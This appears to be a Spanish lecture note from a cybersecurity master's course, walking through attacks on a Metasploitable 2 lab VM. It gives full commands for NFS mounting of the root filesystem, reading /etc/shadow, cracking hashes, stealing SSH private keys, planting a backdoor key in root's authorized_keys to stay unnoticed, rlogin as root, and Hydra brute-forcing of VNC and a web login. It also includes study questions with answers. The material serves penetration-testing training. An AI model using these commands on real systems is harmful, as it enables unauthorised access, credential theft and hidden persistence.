---
tags:
- Explotación y escalada
---

# Sesion 23 Explotacion Servicios Vulnerables II

# Sesión 23 — Explotación avanzada de servicios vulnerables II

**Máster de Ciberseguridad & IA · Curso 2026 · Profesor: Daniel (Evolve Academy)**

Continuación directa de la sesión anterior. Se retoma desde el puerto 80 y se añaden nuevos servicios: SMTP, servicios R (rlogin/rsh/rexec), NFS, VNC y se introduce el hacking web con ffuf, Hydra y Burp Suite. El gran bloque de esta sesión es la **explotación de NFS** para robar/crear claves SSH y romper hashes con John y Hashcat.

## ⚠️ Recordatorio de laboratorio

Todo lo practicado aquí es sobre **Metasploitable 2** en red aislada (VMware host-only o NAT interno). Nunca exponer la VM a internet.

- **Atacante:** Kali Linux actualizada
- **Víctima:** Metasploitable 2 (IP ejemplo: 10.0.2.5, Kali: 10.0.2.15)

**Nota sobre VMware vs VirtualBox:** Daniel recomienda VMware. VirtualBox suele dar problemas con el portapapeles bidireccional y el arrastre de archivos. En VMware la red adaptador puente o red interna suele funcionar sin problemas. Una alternativa para transferir archivos entre host y VM es crear una **carpeta compartida** entre ambos desde la configuración de la VM.

## 1. Repaso del punto de partida

Siempre arrancar con:

nmap -sCV 10.0.2.5 --min-rate=5000 -p-

# -p- escanea los 65.535 puertos

# Presionar VV durante el escaneo para ver el porcentaje de progreso

Lo visto en la sesión anterior (puertos 21, 22, 23, 80, 139/445) ya está cubierto. Esta sesión continúa con los puertos restantes.

## 2. Puerto 80 — HTTP: fuzzing de directorios (repaso y ampliación)

### Herramienta principal: ffuf

ffuf -u http://10.0.2.5/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

- FUZZ → marcador que ffuf sustituye por cada entrada del diccionario
- -c → colores en el output
- -w → diccionario a usar
- El diccionario medium tarda más pero encuentra más cosas (p.ej. phpinfo)

**Buscar subdominios en lugar de subdirectorios:** poner FUZZ al principio de la URL en vez de al final:

ffuf -u http://FUZZ.dominio.com -w diccionario.txt -c

### Alternativa con Metasploit (dir\_scanner)

sudo msfconsole

search dir scanner

use auxiliary/scanner/http/dir\_scanner

show options

set RHOSTS 10.0.2.5

set RPORT 80

run

# Encuentra: cgi, doc, icons... (menos resultados que ffuf con medium)

El escáner de Metasploit tiene un diccionario por defecto, es más rápido pero menos completo. ffuf con un diccionario grande encuentra más cosas, incluido el phpinfo.php clave para la próxima sesión.

### Diccionarios recomendados por Daniel

| **Diccionario** | **Uso principal** | **Tamaño** |
| --- | --- | --- |
| /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | Fuzzing web (ya en Kali) | Mediano |
| /usr/share/dirb/wordlists/common.txt | Fuzzing rápido (ya en Kali) | Pequeño |
| **SecLists** | Todo — web, usuarios, contraseñas, SQLi, LFI... | Muy grande |
| **rockyou.txt** | Romper hashes, fuerza bruta de contraseñas | Grande |
| **Kaonashi** | Contraseñas, se actualiza frecuentemente | Mediano |
| **PayloadsAllTheThings** | Payloads web: XSS, SQLi, LFI, etc. | Variable |

# Instalar SecLists:

sudo git clone https://github.com/danielmiessler/SecLists /usr/share/seclists

# Localizar rockyou (ya en Kali, puede estar comprimido):

locate rockyou.txt

# Si está en .gz: gunzip /usr/share/wordlists/rockyou.txt.gz

Los diccionarios suelen guardarse en /usr/share/wordlists/. Puedes tenerlos también en ~/Desktop para acceso rápido en el lab.

### 

### Hallazgo clave: robots.txt

**Regla de oro:** siempre buscar robots.txt en cualquier web que audites.

robots.txt contiene los directorios que el propietario **no quiere que Google indexe**. Eso mismo los hace interesantes para un pentester.

# Navegar a:

http://10.0.2.5/robots.txt

# También probar en subdirectorios: http://10.0.2.5/twiki/robots.txt

En Metasploitable 2, dentro del robots.txt de TWiki se encuentra un directorio passwords con un archivo que contiene usuarios y contraseñas, y un archivo PHP de configuración con credenciales de base de datos en texto claro (usuario root, contraseña vacía, base de datos metasploit).

**Siempre guardar todo lo que encuentres** — usuarios, contraseñas, hashes, rutas — en un archivo de notas. En la fase de enumeración cuanto más recopilas, más vectores tienes después.

## 3. Puerto 25 — SMTP: enumeración de usuarios

**SMTP** (Simple Mail Transfer Protocol) es el protocolo de envío de correo electrónico. Puertos relacionados: SMTP (25), POP3, IMAP.

El valor de SMTP en pentesting no es enviar correos, sino **enumerar qué usuarios existen** en el sistema usando dos comandos nativos del protocolo.

### Comandos nativos de SMTP

| **Comando** | **Función** |
| --- | --- |
| VRFY usuario | Verifica si ese usuario existe |
| EXPN usuario | Expande una lista de distribución |
| EHLO | Saludo inicial cliente→servidor |

### Enumeración con Metasploit

sudo msfconsole

search smtp\_enum

use 0 # auxiliary/scanner/smtp/smtp\_enum

show options

set RHOSTS 10.0.2.5

# Tiene diccionario de usuarios por defecto (puerto 25)

run

—------------------------------------------------------------------------------------------------------------------------

┌──(kali㉿kali)-[~/Escritorio/recon/usuarios]

└─$ smtp-user-enum -M VRFY -U usuarios\_smtp.txt -t 192.168.52.134

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

----------------------------------------------------------

| Scan Information |

----------------------------------------------------------

Mode ..................... VRFY

Worker Processes ......... 5

Usernames file ........... usuarios\_smtp.txt

Target count ............. 1

Username count ........... 9

Target TCP port .......... 25

Query timeout ............ 5 secs

Target domain ............

######## Scan started at Fri May 29 19:50:26 2026 #########

192.168.52.134: backup exists

192.168.52.134: bin exists

192.168.52.134: daemon exists

192.168.52.134: root exists

192.168.52.134: ftp exists

192.168.52.134: user exists

192.168.52.134: msfadmin exists

192.168.52.134: games exists

192.168.52.134: www-data exists

######## Scan completed at Fri May 29 19:50:26 2026 #########

9 results.

Es para hacer menos ruido.

**Resultado:** devuelve una lista de usuarios del sistema, entre ellos: backup, bin, daemon, ftp, games, www-data, msfadmin, user...

Guardar estos usuarios en un .txt para usarlos después en ataques de fuerza bruta personalizados.

### ¿Qué es www-data?

www-data es la **cuenta de servicio del servidor web** (Apache). Si comprometes una aplicación web, lo normal es obtener una shell como www-data. Es un usuario muy limitado — solo tiene permisos sobre el servicio web. Desde ahí habría que escalar a un usuario local y después a root.

## 4. Puertos 512, 513, 514 — Servicios R (rlogin, rsh, rexec)

Servicios **obsoletos** anteriores a SSH. Permiten conexión remota sin cifrado. En entornos reales es rarísimo encontrarlos, pero Metasploitable 2 los tiene abiertos y mal configurados.

| **Puerto** | **Servicio** |
| --- | --- |
| 512 | rexec |
| 513 | rlogin |
| 514 | rsh |

### Explotación (mala configuración del archivo .rhosts)

El archivo .rhosts contiene las IPs autorizadas a conectarse. En Metasploitable 2 tiene habilitado \* (todas las IPs):

# Instalar cliente si no está:

sudo apt install rsh-redone-client -y

# Conectar directamente como root (sin contraseña):

rlogin -l root 10.0.2.5

whoami # → root

└─$ rlogin -l root 192.168.52.134

Last login: Fri May 29 13:54:02 EDT 2026 from 192.168.52.130 on pts/1

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/\*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by

applicable law.

To access official Ubuntu documentation, please visit:

http://help.ubuntu.com/

You have mail.

root@metasploitable:~# whoami

root

root@metasploitable:~#

Esto funciona porque .rhosts está configurado para permitir cualquier IP. En producción esto jamás debería existir. SSH sustituyó completamente a estos servicios.

## 5. Puerto 2049 — NFS: montar carpeta compartida ⭐

Este es el bloque más importante de la sesión. NFS es **muy común** en entornos reales y en exámenes de certificación (eJPTv2, OSCP).

**NFS** (Network File System) permite compartir carpetas Linux por red. Similar a SMB en Windows. Va sobre el protocolo **RPC** (Remote Procedure Call).

### Flujo completo de explotación NFS

**Paso 1 — Confirmar que NFS está activo:**

rpcinfo -p 10.0.2.5

# Si aparece "nfs" en la lista → NFS está abierto (puerto 2049 TCP)

**Paso 2 — Listar qué carpetas están compartidas:**

showmount -e 10.0.2.5

# Resultado: / \*

# "/" = raíz del sistema; "\*" = accesible desde cualquier IP

# → Tienen compartido TODO el sistema de archivos

En la mayoría de casos reales no encontrarás la raíz compartida, sino carpetas concretas. Pero compartir la raíz (o cualquier carpeta sin restricción de IP) es una mala configuración grave. Cualquier servidor con NFS tiene que restringir quién puede montar qué.

**Paso 3 — Crear carpeta local y montar la carpeta remota:**

mkdir ~/Desktop/carpeta\_meta2

sudo mount -t nfs 10.0.2.5:/ ~/Desktop/carpeta\_meta2

ls ~/Desktop/carpeta\_meta2

# → Ves todo el sistema de archivos de la víctima

**Paso 4 — Explorar el sistema montado:**

# Ver usuarios del sistema:

cat ~/Desktop/carpeta\_meta2/etc/passwd

# Ver hashes de contraseñas:

sudo cat ~/Desktop/carpeta\_meta2/etc/shadow

/etc/shadow contiene los hashes de las contraseñas de todos los usuarios. Si un hash empieza por $1$ → es **MD5crypt** (modo 500 en Hashcat). Si empieza por $6$ → SHA-512. Si tiene \* o ! delante → cuenta **deshabilitada**.

## 6. Romper hashes: John the Ripper y Hashcat

Una vez obtenidos los hashes de /etc/shadow, el objetivo es obtener las contraseñas en texto claro.

### Identificar el tipo de hash

# Herramienta hash-identifier:

hash-identifier

# Pegar el hash → te dice el tipo

# O mirar el prefijo manualmente:

# $1$ → MD5crypt (Hashcat modo 500)

# $5$ → SHA-256 (Hashcat modo 7400)

# $6$ → SHA-512 (Hashcat modo 1800)

### Guardar los hashes en un archivo

# Copiar solo la parte relevante del shadow (usuario:hash):

# Formato: usuario:$1$...:...:...:...:...:

# Solo copiar hasta los primeros dos puntos después del hash

nano hashes.txt

# Pegar los hashes que quieres romper

### John the Ripper

# Romper hashes MD5crypt con rockyou:

john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Ver resultados (se guardan en base de datos interna):

john --show hashes.txt

# Ver progreso mientras corre:

john --status

Tras romper un hash, John lo guarda en su base de datos. Si lanzas de nuevo el mismo comando no te mostrará nada nuevo — usa john --show para ver los ya rotos.

### Hashcat

# Romper MD5crypt (modo 500) con rockyou:

hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt

# Ver resultados guardados:

hashcat -m 500 hashes.txt --show

Hashcat usa la **GPU** para romper hashes mucho más rápido que John. Si tu máquina virtual tiene pocos recursos gráficos, John puede ser más estable. En entornos profesionales se montan servidores con múltiples GPUs dedicadas a Hashcat.

| **Herramienta** | **Ventaja** | **Cuándo usarla** |
| --- | --- | --- |
| **John** | Más sencillo, detecta formato automáticamente | Hashes rápidos, uso general |
| **Hashcat** | Más rápido (GPU), más modos, reglas avanzadas | Hashes difíciles, entornos reales |

## 7. Robar/crear claves SSH desde NFS ⭐

Al tener montado todo el sistema de archivos, tienes acceso a las claves SSH de todos los usuarios.

### Conceptos clave de SSH con claves

| **Archivo** | **Ubicación** | **Función** |
| --- | --- | --- |
| id\_rsa | ~/.ssh/id\_rsa | **Clave privada** — la que se roba o se genera |
| id\_rsa.pub | ~/.ssh/id\_rsa.pub | **Clave pública** — la que se deja en el servidor |
| authorized\_keys | ~/.ssh/authorized\_keys | Lista de claves públicas autorizadas a conectarse |

**Regla de oro:** quien tenga la clave **privada** puede conectarse al servidor que tenga la clave **pública** correspondiente en su authorized\_keys. La pública no es sensible; la privada hay que protegerla.

### Vector 1 — Robar la clave privada existente

# Acceder a la carpeta SSH del usuario msfadmin:

ls -la ~/Desktop/carpeta\_meta2/home/msfadmin/.ssh/

# Encontramos: id\_rsa, id\_rsa.pub, authorized\_keys

# Ver quién está autorizado:

cat ~/Desktop/carpeta\_meta2/home/msfadmin/.ssh/authorized\_keys

# → La clave pública de msfadmin también está en /root/.ssh/authorized\_keys

# → Eso significa que con la clave privada de msfadmin puedes conectarte COMO ROOT

# Copiar la clave privada a tu escritorio:

cp ~/Desktop/carpeta\_meta2/home/msfadmin/.ssh/id\_rsa ~/Desktop/id\_rsa\_robada

# Dar permisos correctos (obligatorio para usar claves SSH):

chmod 600 ~/Desktop/id\_rsa\_robada

# Conectarse como root usando la clave robada:

ssh -i ~/Desktop/id\_rsa\_robada root@10.0.2.5

whoami # → root

**Por qué funciona con root y no con msfadmin:** la clave privada de msfadmin estaba protegida con contraseña para el usuario msfadmin. Pero esa misma clave pública estaba añadida al authorized\_keys de root **sin** protección de contraseña → entramos como root.

### Vector 2 — Añadir nuestra propia clave (persistencia)

En vez de robar, creamos una clave nueva y la añadimos al servidor. Esto se llama **persistencia**: dejamos una puerta trasera para volver cuando queramos.

# 1. Generar un nuevo par de claves SSH (en Kali):

ssh-keygen -t rsa -f ~/Desktop/mi\_clave\_nueva

# Cuando pregunte passphrase → Enter (sin contraseña, importante)

# Genera: mi\_clave\_nueva (privada) y mi\_clave\_nueva.pub (pública)

# 2. Añadir la clave pública al authorized\_keys de root en la víctima:

# (usando >> para AÑADIR, no sobreescribir con >)

cat ~/Desktop/mi\_clave\_nueva.pub >> ~/Desktop/carpeta\_meta2/root/.ssh/authorized\_keys

# 3. Verificar que se ha añadido:

cat ~/Desktop/carpeta\_meta2/root/.ssh/authorized\_keys

# → Ahora hay DOS claves autorizadas

# 4. Dar permisos a la clave privada y conectarse:

chmod 600 ~/Desktop/mi\_clave\_nueva

ssh -i ~/Desktop/mi\_clave\_nueva root@10.0.2.5

whoami # → root

**>> vs >:** con >> añades al final del archivo (persistencia); con > sobreescribirías (destruirías el acceso anterior). En persistencia siempre usar >>.

Al usar la carpeta compartida NFS cualquier cambio que hagas en tu carpeta local montada **se aplica directamente en la víctima** — no es una copia, es acceso en tiempo real al sistema de archivos remoto.

## 8. Puerto 5900 — VNC: fuerza bruta con Hydra

**VNC** (Virtual Network Computing) permite **escritorio remoto gráfico**. Puerto 5900.

# Fuerza bruta con Hydra:

hydra -P /usr/share/wordlists/rockyou.txt vnc://10.0.2.5

# → Encuentra: contraseña "password"

# Conectarse por VNC:

vncviewer 10.0.2.5

# Contraseña: password

# → Escritorio gráfico completo de la víctima

## 9. Hacking web: introducción a Burp Suite

Burp Suite es la herramienta estándar de hacking web. Se introduce aquí y se desarrollará en profundidad en el módulo web.

### ¿Qué es Burp Suite?

Un **proxy** que se interpone entre tu navegador y el servidor web. Captura todas las peticiones HTTP antes de que salgan, permitiendo verlas, modificarlas y reenviarlas.

Navegador → [Burp Suite] → Servidor web

### Configuración inicial

**1. Instalar la extensión FoxyProxy en Firefox:**

- Añadir FoxyProxy desde las extensiones de Firefox
- Configurar: Hostname 127.0.0.1, Puerto 8080

**2. Configurar Burp Suite:**

Burp Suite → Proxy → Intercept → activar "Intercept is on"

**3. Activar FoxyProxy** en Firefox (icono en la barra → seleccionar el proxy de Burp)

### Flujo básico

1. Activar FoxyProxy en Firefox

2. Activar Intercept en Burp

3. Navegar a la web objetivo

4. Burp captura la petición → la página se queda "cargando"

5. En Burp: ver/modificar la petición → Forward para enviarla

Con FoxyProxy activado pero Intercept desactivado, Burp sigue **registrando todo el tráfico** en el historial (pestaña HTTP History). Muy útil para auditar una web sin interrumpir la navegación.

### Herramientas adicionales para análisis web

| **Herramienta** | **Tipo** | **Función** |
| --- | --- | --- |
| **Wappalyzer** | Extensión Firefox/Chrome | Detecta tecnologías de la web (versión Apache, PHP, CMS...) |
| **WhatWeb** | CLI | Análisis de tecnologías desde terminal: whatweb http://10.0.2.5 |

whatweb http://10.0.2.5

# → Muestra: Apache versión, PHP versión, OS, cookies, etc.

### Fuerza bruta en formularios web con Hydra

Para hacer fuerza bruta a un formulario de login (como el de DVWA):

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.5 http-post-form \

"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

Desglose del comando:

- -l admin → probar con usuario fijo admin
- -P rockyou.txt → diccionario de contraseñas
- http-post-form → tipo de petición (POST a un formulario)
- "/ruta:campos:mensaje\_error" → ruta del login, parámetros del formulario, texto que aparece cuando falla

Para saber los nombres de los campos del formulario: click derecho en la página → Inspeccionar → buscar los name="" de los inputs de usuario y contraseña.

**Resultado:** encuentra admin:password → entrar en DVWA con esas credenciales.

## 10. Resumen: nuevos vectores de esta sesión

| **Puerto** | **Servicio** | **Vector** | **Acceso obtenido** |
| --- | --- | --- | --- |
| 25 | SMTP | Enumeración de usuarios con smtp\_enum | Lista de usuarios del sistema |
| 512-514 | Servicios R | rlogin -l root (mala config .rhosts) | root directo |
| 2049 | NFS | Montar / con mount -t nfs | Sistema de archivos completo |
| 2049 | NFS | Robar id\_rsa + ssh -i | root por SSH |
| 2049 | NFS | Añadir clave pública a authorized\_keys | Persistencia como root |
| 5900 | VNC | Fuerza bruta con Hydra (password) | Escritorio remoto |
| 80 | HTTP | robots.txt manual | Credenciales y rutas ocultas |
| 80 | HTTP | Fuerza bruta con Hydra en formulario | Acceso a aplicación web |

## 11. Plan de estudio — recreación paso a paso

1. Lanzar nmap -sCV 10.0.2.5 -p- y anotar todos los puertos.
2. **SMTP (25):** lanzar smtp\_enum en Metasploit y guardar los usuarios en usuarios\_smtp.txt.
3. **Servicios R:** intentar rlogin -l root 10.0.2.5. Comprobar que funciona y entender por qué.
4. **NFS:** rpcinfo -p → showmount -e → mkdir + mount → explorar el sistema montado.
5. **Hashes:** cat /etc/shadow desde la carpeta montada → guardar hashes → romper con John y Hashcat.
6. **Claves SSH:** buscar .ssh en los usuarios → robar id\_rsa → chmod 600 → ssh -i como root.
7. **Persistencia SSH:** ssh-keygen → cat pub >> authorized\_keys → conectar con la nueva clave.
8. **VNC:** Hydra fuerza bruta → vncviewer → escritorio remoto.
9. **Web:** buscar robots.txt manualmente → anotar lo que encuentres.
10. **Burp Suite:** configurar FoxyProxy → capturar una petición de login → inspeccionarla.

## 12. Preguntas de laboratorio

**NFS**

1. ¿Qué comando usas para listar las carpetas compartidas de un servidor NFS? ¿Qué significa que devuelva / \*?
2. ¿Cuál es la diferencia entre > y >> al modificar authorized\_keys? ¿Por qué es importante en persistencia?
3. Tienes montada la raíz de la víctima en ~/Desktop/carpeta. ¿Cómo lees el /etc/shadow?

**Hashes** 4. Ves un hash que empieza por $6$. ¿Qué tipo es y qué modo usas en Hashcat? 5. ¿Qué significa que una línea de /etc/shadow empiece por \* o !? 6. ¿Por qué John the Ripper no muestra resultados si lanzas el mismo comando dos veces? ¿Cómo los ves?

**Claves SSH** 7. Explica la diferencia entre id\_rsa, id\_rsa.pub y authorized\_keys. ¿Cuál es sensible y cuál no? 8. Has robado la clave privada de msfadmin pero al conectarte como msfadmin te pide contraseña. La misma clave sí funciona para root. ¿Por qué? 9. ¿Qué permiso hay que dar siempre a una clave privada antes de usarla con SSH? ¿Qué pasa si no lo haces?

**Burp Suite** 10. ¿Qué diferencia hay entre tener Intercept activado y desactivado en Burp Suite? 11. ¿Para qué sirve el historial HTTP de Burp aunque no estés interceptando? 12. ¿Qué hace FoxyProxy y por qué se usa junto con Burp Suite?

**General** 13. ¿Para qué sirve robots.txt en una web y por qué es interesante para un pentester? 14. ¿Qué usuario obtienes normalmente al comprometer un servicio web y por qué? ¿Cuál sería el siguiente paso? 15. ¿Por qué Hashcat suele ser más rápido que John the Ripper?

1. **Respuestas** showmount -e IP. / \* significa que están compartiendo la raíz del sistema y que cualquier IP puede montarla → gravísimo.
2. > sobreescribe el archivo (destruiría las claves autorizadas existentes); >> añade al final. En persistencia hay que usar >> para no romper el acceso legítimo y pasar desapercibido.
3. sudo cat ~/Desktop/carpeta/etc/shadow
4. SHA-512. Modo 1800 en Hashcat: hashcat -m 1800 hashes.txt diccionario.txt
5. La cuenta existe pero está **deshabilitada** — el usuario no puede autenticarse.
6. John guarda los hashes ya rotos en una base de datos interna y no los repite. Se ven con john --show hashes.txt.
7. id\_rsa = clave privada (sensible, nunca compartir); id\_rsa.pub = clave pública (no sensible); authorized\_keys = lista de claves públicas que el servidor acepta para conectarse.
8. La clave privada de msfadmin estaba protegida con contraseña para ese usuario. Sin embargo, esa misma clave pública estaba añadida en el authorized\_keys de root sin protección adicional.
9. chmod 600 clave\_privada. Si no lo haces SSH rechaza la clave con error "permissions are too open".
10. Con Intercept activado: Burp para cada petición y espera a que la reenvíes manualmente. Con Intercept desactivado: el tráfico pasa directamente pero se sigue registrando en el historial.
11. Permite ver todas las peticiones que ha hecho el navegador, inspeccionarlas, encontrar parámetros y credenciales aunque no hayas interceptado nada activamente.
12. FoxyProxy es una extensión de Firefox que redirige el tráfico del navegador al proxy de Burp Suite (127.0.0.1:8080) con un solo clic, sin tener que cambiar la configuración del sistema.
13. robots.txt dice a los buscadores qué no indexar. Para un pentester eso significa directorios privados, paneles de administración, archivos de configuración → los más interesantes están ahí precisamente porque el propietario no quiere que se vean.
14. www-data, porque es el usuario que ejecuta Apache. Siguiente paso: escalar a un usuario local del sistema y después a root con sudo -l o GTFOBins.
15. Hashcat usa la GPU (tarjeta gráfica), que puede hacer millones de operaciones en paralelo. John usa principalmente la CPU.
